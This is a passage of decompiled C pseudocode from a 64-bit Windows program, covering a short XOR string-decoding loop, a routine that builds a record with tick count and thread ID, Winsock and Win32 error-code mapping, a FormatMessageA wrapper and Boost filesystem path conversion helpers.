      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA5F0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xD );
  return v3;
}
// 1400DA5D0: using guessed type int dword_1400DA5D0;
// 1400DA5D4: using guessed type int dword_1400DA5D4;
// 1400DA5D8: using guessed type int dword_1400DA5D8;
// 1400DA5E0: using guessed type int dword_1400DA5E0;
// 1400DA5E4: using guessed type char byte_1400DA5E4;
// 1400DA5E8: using guessed type int dword_1400DA5E8;
// 1400DA5F1: using guessed type char byte_1400DA5F1;
// 1400DA5F2: using guessed type char byte_1400DA5F2;
// 1400DA5F3: using guessed type char byte_1400DA5F3;
// 1400DA5F4: using guessed type char byte_1400DA5F4;
// 1400DA5F5: using guessed type char byte_1400DA5F5;
// 1400DA5F6: using guessed type char byte_1400DA5F6;
// 1400DA5F7: using guessed type char byte_1400DA5F7;
// 1400DA5F8: using guessed type char byte_1400DA5F8;
// 1400DA5F9: using guessed type char byte_1400DA5F9;
// 1400DA5FA: using guessed type char byte_1400DA5FA;
// 1400DA5FB: using guessed type char byte_1400DA5FB;
// 1400DA5FC: using guessed type char byte_1400DA5FC;

//----- (000000014002FAE0) ----------------------------------------------------
void __fastcall sub_14002FAE0(__int64 a1, int a2)
{
  int v2; // er15
  __int64 v3; // r14
  unsigned __int8 **v4; // rax
  __int64 v5; // rsi
  volatile signed __int32 *v6; // rbx
  _QWORD *v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  _QWORD *v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  _QWORD *v13; // rax
  __int64 v14; // rax
  __int64 v15; // rax
  _QWORD *v16; // rax
  __int64 v17; // rax
  __int64 v18; // rax
  _QWORD *v19; // rax
  __int64 v20; // rax
  __int64 v21; // rax
  _QWORD *v22; // rax
  __int64 v23; // rax
  __int64 v24; // rax
  int v25; // eax
  _QWORD *v26; // rax
  __int64 v27; // rax
  __int64 v28; // rax
  int v29; // eax
  _QWORD *v30; // rax
  __int64 v31; // rax
  __int64 v32; // rax
  _QWORD *v33; // rax
  __int64 v34; // rsi
  volatile signed __int32 **v35; // rax
  volatile signed __int32 *v36; // rbx
  _QWORD *v37; // rax
  volatile signed __int32 *v38; // rbx
  __int64 v39; // rax
  _QWORD *v40; // rax
  volatile signed __int32 *v41; // [rsp+28h] [rbp-D8h]
  char v42; // [rsp+30h] [rbp-D0h]
  __int64 v43; // [rsp+48h] [rbp-B8h]
  volatile signed __int32 *v44; // [rsp+50h] [rbp-B0h]
  volatile signed __int32 *v45; // [rsp+58h] [rbp-A8h]
  char v46; // [rsp+60h] [rbp-A0h]
  char v47; // [rsp+78h] [rbp-88h]
  __int64 v48; // [rsp+90h] [rbp-70h]
  char v49; // [rsp+98h] [rbp-68h]
  char v50; // [rsp+B0h] [rbp-50h]
  char v51; // [rsp+C8h] [rbp-38h]
  char v52; // [rsp+E0h] [rbp-20h]
  char v53; // [rsp+F8h] [rbp-8h]
  volatile signed __int32 *v54; // [rsp+100h] [rbp+0h]
  char v55; // [rsp+108h] [rbp+8h]
  char v56; // [rsp+120h] [rbp+20h]
  void *v57; // [rsp+138h] [rbp+38h]
  __int64 v58; // [rsp+148h] [rbp+48h]
  unsigned __int64 v59; // [rsp+150h] [rbp+50h]
  void *v60; // [rsp+158h] [rbp+58h]
  __int64 v61; // [rsp+168h] [rbp+68h]
  unsigned __int64 v62; // [rsp+170h] [rbp+70h]
  void *v63; // [rsp+178h] [rbp+78h]
  __int64 v64; // [rsp+188h] [rbp+88h]
  unsigned __int64 v65; // [rsp+190h] [rbp+90h]
  void *v66; // [rsp+198h] [rbp+98h]
  __int64 v67; // [rsp+1A8h] [rbp+A8h]
  unsigned __int64 v68; // [rsp+1B0h] [rbp+B0h]
  void *v69; // [rsp+1B8h] [rbp+B8h]
  __int64 v70; // [rsp+1C8h] [rbp+C8h]
  unsigned __int64 v71; // [rsp+1D0h] [rbp+D0h]
  void *Src; // [rsp+1D8h] [rbp+D8h]
  __int64 v73; // [rsp+1E8h] [rbp+E8h]
  unsigned __int64 v74; // [rsp+1F0h] [rbp+F0h]
  void *v75; // [rsp+1F8h] [rbp+F8h]
  __int64 v76; // [rsp+208h] [rbp+108h]
  unsigned __int64 v77; // [rsp+210h] [rbp+110h]
  void *v78; // [rsp+218h] [rbp+118h]
  __int64 v79; // [rsp+228h] [rbp+128h]
  unsigned __int64 v80; // [rsp+230h] [rbp+130h]
  void *v81; // [rsp+238h] [rbp+138h]
  __int64 v82; // [rsp+248h] [rbp+148h]
  unsigned __int64 v83; // [rsp+250h] [rbp+150h]
  void *v84; // [rsp+258h] [rbp+158h]
  __int64 v85; // [rsp+268h] [rbp+168h]
  unsigned __int64 v86; // [rsp+270h] [rbp+170h]
  __int64 (__fastcall **v87)(void *); // [rsp+278h] [rbp+178h]
  void *v88; // [rsp+280h] [rbp+180h]
  __int64 v89; // [rsp+290h] [rbp+190h]
  unsigned __int64 v90; // [rsp+298h] [rbp+198h]
  char v91; // [rsp+2B0h] [rbp+1B0h]

  v48 = -2i64;
  v2 = a2;
  v3 = a1;
  v4 = (unsigned __int8 **)sub_14002EF80(&v53);
  v5 = (unsigned __int8)sub_14002F170(*v4);
  v6 = v54;
  if ( v54 )
  {
    if ( !_InterlockedDecrement(v54 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 8i64))(v6);
      if ( !_InterlockedDecrement(v6 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 16i64))(v6);
    }
  }
  if ( (_BYTE)v5 )
  {
    sub_14006BD10((__int64)&v42, 0);
    sub_14006BCD0((__int64)&v52, v2);
    v7 = sub_14002F8D0(&v63);
    v8 = sub_14006C0C0((__int64)&v42, v7);
    v9 = sub_14006C4B0(v8, &unk_1400A75A0);
    sub_14006BFB0(v9);
    if ( v65 >= 0x10 )
      operator delete(v63);
    v65 = 15i64;
    v64 = 0i64;
    LOBYTE(v63) = 0;
    sub_14006BF10((__int64)&v52);
    sub_14006BC80((__int64)&v50, (void **)(v3 + 40));
    v10 = sub_14002F8D0(&v57);
    v11 = sub_14006C0C0((__int64)&v42, v10);
    v12 = sub_14006C4B0(v11, &unk_1400A75A4);
    sub_14006BFB0(v12);
    if ( v59 >= 0x10 )
      operator delete(v57);
    v59 = 15i64;
    v58 = 0i64;
    LOBYTE(v57) = 0;
    sub_14006BF10((__int64)&v50);
    sub_14006BC80((__int64)&v55, (void **)(v3 + 8));
    v13 = sub_14002F8D0(&v84);
    v14 = sub_14006C0C0((__int64)&v42, v13);
    v15 = sub_14006C4B0(v14, "o");
    sub_14006BFB0(v15);
    if ( v86 >= 0x10 )
      operator delete(v84);
    v86 = 15i64;
    v85 = 0i64;
    LOBYTE(v84) = 0;
    sub_14006BF10((__int64)&v55);
    sub_14006BC80((__int64)&v47, (void **)(v3 + 72));
    v16 = sub_14002F8D0(&v69);
    v17 = sub_14006C0C0((__int64)&v42, v16);
    v18 = sub_14006C4B0(v17, &unk_1400A75A8);
    sub_14006BFB0(v18);
    if ( v71 >= 0x10 )
      operator delete(v69);
    v71 = 15i64;
    v70 = 0i64;
    LOBYTE(v69) = 0;
    sub_14006BF10((__int64)&v47);
    sub_14006BCD0((__int64)&v49, *(_DWORD *)(v3 + 104));
    v19 = sub_14002F8D0(&v81);
    v20 = sub_14006C0C0((__int64)&v42, v19);
    v21 = sub_14006C4B0(v20, &unk_1400A75AC);
    sub_14006BFB0(v21);
    if ( v83 >= 0x10 )
      operator delete(v81);
    v83 = 15i64;
    v82 = 0i64;
    LOBYTE(v81) = 0;
    sub_14006BF10((__int64)&v49);
    sub_14006BCD0((__int64)&v51, *(_DWORD *)(v3 + 112));
    v22 = sub_14002F8D0(&v75);
    v23 = sub_14006C0C0((__int64)&v42, v22);
    v24 = sub_14006C4B0(v23, &unk_1400A75B0);
    sub_14006BFB0(v24);
    if ( v77 >= 0x10 )
      operator delete(v75);
    v77 = 15i64;
    v76 = 0i64;
    LOBYTE(v75) = 0;
    sub_14006BF10((__int64)&v51);
    v25 = GetTickCount();
    sub_14006BCD0((__int64)&v46, v25);
    v26 = sub_14002F8D0(&v60);
    v27 = sub_14006C0C0((__int64)&v42, v26);
    v28 = sub_14006C4B0(v27, &unk_1400A75B4);
    sub_14006BFB0(v28);
    if ( v62 >= 0x10 )
      operator delete(v60);
    v62 = 15i64;
    v61 = 0i64;
    LOBYTE(v60) = 0;
    sub_14006BF10((__int64)&v46);
    v29 = GetCurrentThreadId();
    sub_14006BCD0((__int64)&v56, v29);
    v30 = sub_14002F8D0(&v66);
    v31 = sub_14006C0C0((__int64)&v42, v30);
    v32 = sub_14006C4B0(v31, &unk_1400A75B8);
    sub_14006BFB0(v32);
    if ( v68 >= 0x10 )
      operator delete(v66);
    v68 = 15i64;
    v67 = 0i64;
    LOBYTE(v66) = 0;
    sub_14006BF10((__int64)&v56);
    v33 = operator new(0x10ui64);
    v34 = (__int64)v33;
    if ( v33 )
    {
      *v33 = &off_1400A2D60;
      v33[1] = &off_1400A2D48;
    }
    else
    {
      v34 = 0i64;
    }
    v35 = (volatile signed __int32 **)sub_140008610(&v45, v34);
    v41 = *v35;
    *v35 = 0i64;
    v36 = v45;
    if ( v45 )
    {
      if ( !_InterlockedDecrement(v45 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v36 + 8i64))(v36);
        if ( !_InterlockedDecrement(v36 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v36 + 16i64))(v36);
      }
    }
    sub_140008430();
    v43 = v34;
    v44 = v41;
    if ( v41 )
      _InterlockedIncrement(v41 + 2);
    v37 = sub_14002F570(&Src);
    sub_1400780C0(&v91, v37, &v43, 0i64, v34);
    if ( v74 >= 0x10 )
      operator delete(Src);
    v74 = 15i64;
    v73 = 0i64;
    LOBYTE(Src) = 0;
    v38 = v44;
    if ( v44 )
    {
      if ( !_InterlockedDecrement(v44 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v38 + 8i64))(v38);
        if ( !_InterlockedDecrement(v38 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v38 + 16i64))(v38);
      }
    }
    v39 = sub_140072820((__int64)&v87);
    v40 = (_QWORD *)(*(__int64 (__fastcall **)(__int64, void **, char *))(*(_QWORD *)v39 + 8i64))(v39, &v78, &v42);
    if ( v40[3] >= 0x10ui64 )
      v40 = (_QWORD *)*v40;
    sub_140078A90(&v91, v40);
    if ( v80 >= 0x10 )
      operator delete(v78);
    v80 = 15i64;
    v79 = 0i64;
    LOBYTE(v78) = 0;
    v87 = &off_1400A2B70;
    if ( v90 >= 0x10 )
      operator delete(v88);
    v90 = 15i64;
    v89 = 0i64;
    LOBYTE(v88) = 0;
    sub_14007E240(&v87);
    sub_1400782B0(&v91);
    if ( v41 && !_InterlockedDecrement(v41 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v41 + 8i64))(v41);
      if ( !_InterlockedDecrement(v41 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v41 + 16i64))(v41);
    }
    sub_14006BF10((__int64)&v42);
  }
}
// 14002EF80: using guessed type __int64 __fastcall sub_14002EF80(_QWORD);
// 1400780C0: using guessed type __int64 __fastcall sub_1400780C0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 140078A90: using guessed type __int64 __fastcall sub_140078A90(_QWORD, _QWORD);
// 1400A2B70: using guessed type __int64 (__fastcall *off_1400A2B70)(void *);
// 1400A2D48: using guessed type __int64 (__fastcall *off_1400A2D48)();
// 1400A2D60: using guessed type __int64 (__fastcall *off_1400A2D60)();

//----- (0000000140030190) ----------------------------------------------------
__int64 __fastcall sub_140030190(__int64 a1, __int64 a2, signed int a3)
{
  signed int v3; // edi
  __int64 v4; // rbx

  v3 = a3;
  v4 = a2;
  if ( a3 > 267 )
  {
    if ( a3 > 10004 )
    {
      switch ( a3 )
      {
        case 10009:
          sub_1400307C0(a2, 9i64);
          return v4;
        case 10013:
          goto LABEL_34;
        case 10014:
          sub_1400307C0(a2, 14i64);
          return v4;
        case 10022:
          goto LABEL_12;
        case 10024:
LABEL_17:
          sub_1400307C0(a2, 24i64);
          return v4;
        case 10035:
          sub_1400307C0(a2, 140i64);
          return v4;
        case 10036:
          sub_1400307C0(a2, 112i64);
          return v4;
        case 10037:
          sub_1400307C0(a2, 103i64);
          return v4;
        case 10038:
          sub_1400307C0(a2, 128i64);
          return v4;
        case 10039:
          sub_1400307C0(a2, 109i64);
          return v4;
        case 10040:
          sub_1400307C0(a2, 115i64);
          return v4;
        case 10041:
          sub_1400307C0(a2, 136i64);
          return v4;
        case 10042:
          sub_1400307C0(a2, 123i64);
          return v4;
        case 10043:
          sub_1400307C0(a2, 135i64);
          return v4;
        case 10045:
          sub_1400307C0(a2, 130i64);
          return v4;
        case 10047:
          sub_1400307C0(a2, 102i64);
          return v4;
        case 10048:
          sub_1400307C0(a2, 100i64);
          return v4;
        case 10049:
          sub_1400307C0(a2, 101i64);
          return v4;
        case 10050:
          sub_1400307C0(a2, 116i64);
          return v4;
        case 10051:
          sub_1400307C0(a2, 118i64);
          return v4;
        case 10052:
          sub_1400307C0(a2, 117i64);
          return v4;
        case 10053:
          sub_1400307C0(a2, 106i64);
          return v4;
        case 10054:
          sub_1400307C0(a2, 108i64);
          return v4;
        case 10055:
          sub_1400307C0(a2, 119i64);
          return v4;
        case 10056:
          sub_1400307C0(a2, 113i64);
          return v4;
        case 10057:
          sub_1400307C0(a2, 126i64);
          return v4;
        case 10060:
          sub_1400307C0(a2, 138i64);
          return v4;
        case 10061:
          sub_1400307C0(a2, 107i64);
          return v4;
        case 10063:
LABEL_7:
          sub_1400307C0(a2, 38i64);
          return v4;
        case 10065:
          sub_1400307C0(a2, 110i64);
          return v4;
        default:
          break;
      }
    }
    else
    {
      if ( a3 == 10004 )
      {
        sub_1400307C0(a2, 4i64);
        return v4;
      }
      if ( a3 > 1013 )
      {
        if ( a3 == 1237 )
        {
LABEL_15:
          sub_1400307C0(a2, 11i64);
          return v4;
        }
        if ( a3 == 2401 || a3 == 2404 )
        {
LABEL_31:
          sub_1400307C0(a2, 16i64);
          return v4;
        }
      }
      else
      {
        switch ( a3 )
        {
          case 1013:
            goto LABEL_26;
          case 995:
            sub_1400307C0(a2, 105i64);
            return v4;
          case 998:
LABEL_34:
            sub_1400307C0(a2, 13i64);
            return v4;
          case 1011:
          case 1012:
LABEL_26:
            sub_1400307C0(a2, 5i64);
            return v4;
        }
      }
    }
  }
  else
  {
    if ( a3 == 267 )
    {
LABEL_12:
      sub_1400307C0(a2, 22i64);
      return v4;
    }
    switch ( a3 )
    {
      case 0:
        sub_1400307C0(a2, 0i64);
        return v4;
      case 1:
        sub_1400307C0(a2, 40i64);
        return v4;
      case 2:
      case 3:
        sub_1400307C0(a2, 2i64);
        return v4;
      case 4:
        goto LABEL_17;
      case 5:
      case 12:
      case 16:
      case 19:
      case 32:
      case 82:
        goto LABEL_34;
      case 6:
      case 123:
      case 131:
        goto LABEL_12;
      case 8:
      case 14:
        sub_1400307C0(a2, 12i64);
        return v4;
      case 15:
      case 20:
      case 55:
        sub_1400307C0(a2, 19i64);
        return v4;
      case 17:
        sub_1400307C0(a2, 18i64);
        return v4;
      case 21:
        goto LABEL_15;
      case 25:
      case 29:
      case 30:
      case 110:
        goto LABEL_26;
      case 33:
      case 212:
        sub_1400307C0(a2, 39i64);
        return v4;
      case 39:
      case 112:
        sub_1400307C0(a2, 28i64);
        return v4;
      case 80:
      case 183:
        sub_1400307C0(a2, 17i64);
        return v4;
      case 111:
        goto LABEL_7;
      case 142:
      case 170:
        goto LABEL_31;
      case 145:
        sub_1400307C0(a2, 41i64);
        return v4;
      default:
        break;
    }
  }
  if ( !(dword_1400DA690 & 1) )
  {
    dword_1400DA690 |= 1u;
    qword_1400DA688 = (__int64)off_1400A7758;
    atexit(sub_14009FD90);
  }
  *(_DWORD *)v4 = v3;
  *(_QWORD *)(v4 + 8) = &qword_1400DA688;
  return v4;
}
// 1400307C0: using guessed type __int64 __fastcall sub_1400307C0(_QWORD, _QWORD);
// 1400A7758: using guessed type __int64 (__fastcall *off_1400A7758[2])();
// 1400DA688: using guessed type __int64 qword_1400DA688;
// 1400DA690: using guessed type int dword_1400DA690;

//----- (00000001400307A0) ----------------------------------------------------
bool __fastcall sub_1400307A0(__int64 a1, __int64 a2, int a3)
{
  return a1 == *(_QWORD *)(a2 + 8) && *(_DWORD *)a2 == a3;
}

//----- (00000001400309C0) ----------------------------------------------------
_QWORD *__fastcall sub_1400309C0(__int64 a1, __int64 a2, DWORD a3)
{
  _QWORD *v3; // rdi
  DWORD v4; // eax
  void *v5; // rbx
  size_t v6; // r8
  __int64 *v7; // rax
  __int64 v8; // rdx
  unsigned __int64 v9; // r8
  __int64 *v10; // rax
  __int64 v11; // r9
  __int64 *v12; // rax
  __int64 *v13; // rax
  __int64 v14; // r9
  __int64 *v15; // rax
  unsigned __int64 v16; // rcx
  CHAR Buffer[8]; // [rsp+48h] [rbp-1h]
  __int64 v19; // [rsp+50h] [rbp+7h]
  void *v20; // [rsp+58h] [rbp+Fh]
  __int64 v21; // [rsp+60h] [rbp+17h]
  __int64 *Src; // [rsp+68h] [rbp+1Fh]
  unsigned __int64 v23; // [rsp+78h] [rbp+2Fh]
  unsigned __int64 v24; // [rsp+80h] [rbp+37h]

  v19 = -2i64;
  v3 = (_QWORD *)a2;
  v21 = a2;
  *(_QWORD *)Buffer = 0i64;
  v4 = FormatMessageA(0x1300u, 0i64, a3, 0x400u, Buffer, 0, 0i64);
  v5 = *(void **)Buffer;
  v20 = *(void **)Buffer;
  if ( v4 )
  {
    v24 = 15i64;
    v23 = 0i64;
    LOBYTE(Src) = 0;
    if ( **(_BYTE **)Buffer )
    {
      v6 = -1i64;
      do
        ++v6;
      while ( *(_BYTE *)(*(_QWORD *)Buffer + v6) );
    }
    else
    {
      v6 = 0i64;
    }
    sub_140004F20(&Src, *(void **)Buffer, v6);
    while ( v23 )
    {
      v7 = (__int64 *)&Src;
      v8 = (__int64)Src;
      v9 = v24;
      if ( v24 >= 0x10 )
        v7 = Src;
      if ( *((_BYTE *)v7 + v23 - 1) != 10 )
      {
        v10 = (__int64 *)&Src;
        if ( v24 >= 0x10 )
          v10 = Src;
        if ( *((_BYTE *)v10 + v23 - 1) != 13 )
        {
          if ( v23 )
          {
            v13 = (__int64 *)&Src;
            if ( v24 >= 0x10 )
              v13 = Src;
            if ( *((_BYTE *)v13 + v23 - 1) == 46 )
            {
              v14 = v23 - 1;
              if ( v23 < v23 - 1 )
              {
                std::_Xout_of_range("invalid string position");
                __debugbreak();
              }
              v23 = v14;
              v15 = (__int64 *)&Src;
              if ( v9 >= 0x10 )
                v15 = (__int64 *)v8;
              *((_BYTE *)v15 + v14) = 0;
            }
          }
          break;
        }
      }
      v11 = v23 - 1;
      if ( v23 < v23 - 1 )
      {
        std::_Xout_of_range("invalid string position");
        __debugbreak();
        break;
      }
      --v23;
      v12 = (__int64 *)&Src;
      if ( v24 >= 0x10 )
        v12 = Src;
      *((_BYTE *)v12 + v11) = 0;
    }
    v3[3] = 15i64;
    v3[2] = 0i64;
    *(_BYTE *)v3 = 0;
    v16 = v24;
    if ( v24 >= 0x10 )
    {
      *v3 = Src;
      Src = 0i64;
    }
    else if ( v23 != -1i64 )
    {
      memmove(v3, &Src, v23 + 1);
      v16 = v24;
    }
    v3[2] = v23;
    v3[3] = v16;
    v24 = 15i64;
    v23 = 0i64;
    LOBYTE(Src) = 0;
  }
  else
  {
    v3[3] = 15i64;
    v3[2] = 0i64;
    *(_BYTE *)v3 = 0;
    sub_140004F20(v3, "Unknown error", 0xDui64);
  }
  LocalFree(v5);
  return v3;
}
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);

//----- (0000000140030BE0) ----------------------------------------------------
const char *sub_140030BE0()
{
  return "generic";
}

//----- (0000000140030BF0) ----------------------------------------------------
const char *sub_140030BF0()
{
  return "system";
}

//----- (0000000140030C60) ----------------------------------------------------
void __fastcall sub_140030C60(void *Src, char *a2, _QWORD *a3, __int64 a4)
{
  __int64 v4; // r15
  _QWORD *v5; // r14
  char *v6; // rdi
  void *v7; // rsi
  signed __int64 v8; // rdi
  unsigned __int64 v9; // rbp
  char *v10; // ST30_8
  char v11; // [rsp+40h] [rbp-248h]
  __int64 v12; // [rsp+240h] [rbp-48h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = Src;
  if ( !a2 )
  {
    v8 = -1i64;
    do
      ++v8;
    while ( *((_BYTE *)Src + v8) );
    v6 = (char *)Src + v8;
  }
  if ( Src != v6 )
  {
    v9 = 3 * (v6 - (_BYTE *)Src);
    if ( v9 <= 0x100 )
    {
      sub_140030E40(Src, (__int64)v6, &v11, (__int64)&v12, a3, a4);
    }
    else
    {
      v10 = (char *)operator new(saturated_mul(v9, 2ui64));
      sub_140030E40(v7, (__int64)v6, v10, (__int64)&v10[6 * (v6 - (_BYTE *)v7)], v5, v4);
      operator delete[](v10);
    }
  }
}

//----- (0000000140030D50) ----------------------------------------------------
void __fastcall sub_140030D50(void *Src, char *a2, _QWORD *a3, __int64 a4)
{
  __int64 v4; // r15
  _QWORD *v5; // r14
  char *v6; // rsi
  void *v7; // rdi
  signed __int64 v8; // rax
  signed __int64 v9; // rax
  unsigned __int64 v10; // rbp
  char *v11; // ST30_8
  char v12; // [rsp+40h] [rbp-148h]
  __int64 v13; // [rsp+140h] [rbp-48h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = Src;
  if ( !a2 )
  {
    v8 = -1i64;
    do
      ++v8;
    while ( *((_WORD *)Src + v8) );
    v6 = (char *)Src + 2 * v8;
  }
  if ( Src != v6 )
  {
    v9 = (v6 - (_BYTE *)Src) >> 1;
    v10 = 4 * v9 + 4;
    if ( v10 <= 0x100 )
    {
      sub_140030F80(Src, (__int64)v6, &v12, (__int64)&v13, a3, a4);
    }
    else
    {
      v11 = (char *)operator new(4 * v9 + 4);
      sub_140030F80(v7, (__int64)v6, v11, (__int64)&v11[v10], v5, v4);
      operator delete[](v11);
    }
  }
}

//----- (0000000140030E40) ----------------------------------------------------
_QWORD *__fastcall sub_140030E40(void *Src, __int64 a2, char *a3, __int64 a4, _QWORD *Srca, __int64 a6)
{
  char *v6; // rsi
  int v7; // edi
  unsigned __int64 v8; // rcx
  _QWORD *v9; // rdx
  _QWORD *v10; // rax
  __int64 v12; // rbx
  int v13; // [rsp+40h] [rbp-98h]
  __int64 v14; // [rsp+48h] [rbp-90h]
  const char *v15; // [rsp+50h] [rbp-88h]
  char v16; // [rsp+58h] [rbp-80h]
  void *v17; // [rsp+60h] [rbp-78h]
  int v18; // [rsp+78h] [rbp-60h]
  __int64 v19; // [rsp+80h] [rbp-58h]
  char v20; // [rsp+88h] [rbp-50h]
  __int64 v21; // [rsp+98h] [rbp-40h]
  __int64 v22; // [rsp+A0h] [rbp-38h]

  v6 = a3;
  v13 = 0;
  v7 = std::codecvt<wchar_t,char,int>::in(a6, &v13, Src, a2, &v16, a3, a4, &v14, *(_QWORD *)&v13);
  if ( v7 )
  {
    v12 = sub_140034C70();
    v15 = "boost::filesystem::path codecvt to wstring";
    std::exception::exception((std::exception *)&v17, &v15);
    v17 = &loc_1400A3CD0;
    v18 = v7;
    v19 = v12;
    v22 = 15i64;
    v21 = 0i64;
    v20 = 0;
    CxxThrowException(&v17, &_TI3_AVsystem_error_system_boost__);
  }
  v8 = Srca[3];
  if ( v8 < 8 )
    v9 = Srca;
  else
    v9 = (_QWORD *)*Srca;
  if ( v8 < 8 )
    v10 = Srca;
  else
    v10 = (_QWORD *)*Srca;
  return sub_140032EB0(Srca, (__int64)v10 + 2 * Srca[2], (__int64)v9 + 2 * Srca[2], v6, v14);
}
// 140034C70: using guessed type __int64 sub_140034C70(void);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1590: using guessed type __int64 __fastcall std::codecvt<wchar_t,char,int>::in(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);
// 1400D3E58: using guessed type int _TI3_AVsystem_error_system_boost__;

//----- (0000000140030F80) ----------------------------------------------------
_QWORD *__fastcall sub_140030F80(void *Src, __int64 a2, char *a3, __int64 a4, _QWORD *Srca, __int64 a6)
{
  char *v6; // rsi
  int v7; // edi
  unsigned __int64 v8; // rax
  _QWORD *v9; // rcx
  _QWORD *v10; // rax
  __int64 v12; // rbx
  int v13; // [rsp+40h] [rbp-98h]
  __int64 v14; // [rsp+48h] [rbp-90h]
  const char *v15; // [rsp+50h] [rbp-88h]
  char v16; // [rsp+58h] [rbp-80h]
  void *v17; // [rsp+60h] [rbp-78h]
  int v18; // [rsp+78h] [rbp-60h]
  __int64 v19; // [rsp+80h] [rbp-58h]
  char v20; // [rsp+88h] [rbp-50h]
  __int64 v21; // [rsp+98h] [rbp-40h]
  __int64 v22; // [rsp+A0h] [rbp-38h]

  v6 = a3;
  v13 = 0;
  v7 = std::codecvt<wchar_t,char,int>::out(a6, &v13, Src, a2, &v16, a3, a4, &v14, *(_QWORD *)&v13);
  if ( v7 )
  {
    v12 = sub_140034C70();
    v15 = "boost::filesystem::path codecvt to string";
    std::exception::exception((std::exception *)&v17, &v15);
    v17 = &loc_1400A3CD0;
    v18 = v7;
    v19 = v12;
    v22 = 15i64;
    v21 = 0i64;
    v20 = 0;
    CxxThrowException(&v17, &_TI3_AVsystem_error_system_boost__);
  }
  v8 = Srca[3];
  if ( v8 < 0x10 )
    v9 = Srca;
  else
    v9 = (_QWORD *)*Srca;
  if ( v8 < 0x10 )
    v10 = Srca;
  else
    v10 = (_QWORD *)*Srca;
  return sub_1400310C0(Srca, (__int64)v10 + Srca[2], (__int64)v9 + Srca[2], v6, v14);
}
// 140034C70: using guessed type __int64 sub_140034C70(void);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1588: using guessed type __int64 __fastcall std::codecvt<wchar_t,char,int>::out(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);
// 1400D3E58: using guessed type int _TI3_AVsystem_error_system_boost__;

//----- (00000001400310C0) ----------------------------------------------------
_QWORD *__usercall sub_1400310C0@<rax>(void *Src@<rcx>, __int64 a2@<rdx>, __int64 a3@<r8>, char *a4@<r9>, __int64 a5)
{
  _QWORD *v5; // rbx
  unsigned __int64 v6; // rax
  unsigned __int64 v7; // r8
  _QWORD *result; // rax
  size_t v9; // rax
  size_t v10; // r8

  v5 = Src;
  if ( a4 == (char *)a5 )
  {
    if ( *((_QWORD *)Src + 3) >= 0x10ui64 )
      Src = *(void **)Src;
    v6 = 0i64;
    if ( a3 )
      v7 = a3 - a2;
    else
      v7 = 0i64;
    if ( a2 )
      v6 = a2 - (_QWORD)Src;
    sub_140005230(v5, v6, v7);
    result = v5;
  }
  else
  {
    if ( *((_QWORD *)Src + 3) >= 0x10ui64 )
      Src = *(void **)Src;
    v9 = 0i64;
    if ( a3 )
      v10 = a3 - a2;
    else
      v10 = 0i64;
    if ( a2 )
      v9 = a2 - (_QWORD)Src;
    sub_140008200(v5, v9, v10, a4, a5 - (_QWORD)a4);
    result = v5;
  }
  return result;
}

//----- (0000000140031150) ----------------------------------------------------
__int64 *__usercall sub_140031150@<rax>(void *Src@<rcx>, unsigned __int64 a2@<rdx>, unsigned __int64 a3@<r8>, char *a4@<r9>, __int64 a5)
{
  const void *v5; // rbp
  unsigned __int64 v6; // rsi
  unsigned __int64 v7; // r12
  _QWORD *v8; // rbx
  unsigned __int64 v9; // r8
  char *v10; // rax
  char *v11; // rax
  unsigned __int64 v13; // rcx
  unsigned __int64 v14; // r15
  unsigned __int64 v15; // r15
  unsigned __int64 v16; // rax
  _QWORD *v17; // rdx
  _QWORD *v18; // rcx
  __int64 v19; // r8
  unsigned __int64 v20; // rdi
  unsigned __int64 v21; // rcx
  unsigned __int64 v22; // rax
  _QWORD *v23; // rdx
  _QWORD *v24; // rcx
  _WORD *v25; // rax
  bool v26; // cf
  _QWORD *v27; // rcx

  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = Src;
  if ( !a4 )
    goto LABEL_59;
  v9 = *((_QWORD *)Src + 3);
  v10 = (char *)(v9 < 8 ? Src : *(_QWORD *)Src);
  if ( a4 < v10 )
    goto LABEL_59;
  if ( v9 >= 8 )
    Src = *(void **)Src;
  if ( (char *)Src + 2 * v8[2] <= a4 )
  {
LABEL_59:
    v13 = v8[2];
    if ( v13 < a2 )
    {
      std::_Xout_of_range("invalid string position");
      __debugbreak();
    }
    v14 = v13 - a2;
    if ( v13 - a2 < v6 )
      v6 = v13 - a2;
    if ( -1 - a5 <= v13 - v6 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    v15 = v14 - v6;
    if ( a5 < v6 )
    {
      v16 = v8[3];
      v17 = v16 < 8 ? v8 : *v8;
      v18 = v16 < 8 ? v8 : *v8;
      if ( v15 )
        memmove((char *)v18 + 2 * (v7 + a5), (char *)v17 + 2 * (v7 + v6), 2 * v15);
    }
    if ( !a5 && !v6 )
      return v8;
    v19 = v8[2];
    v20 = a5 + v8[2] - v6;
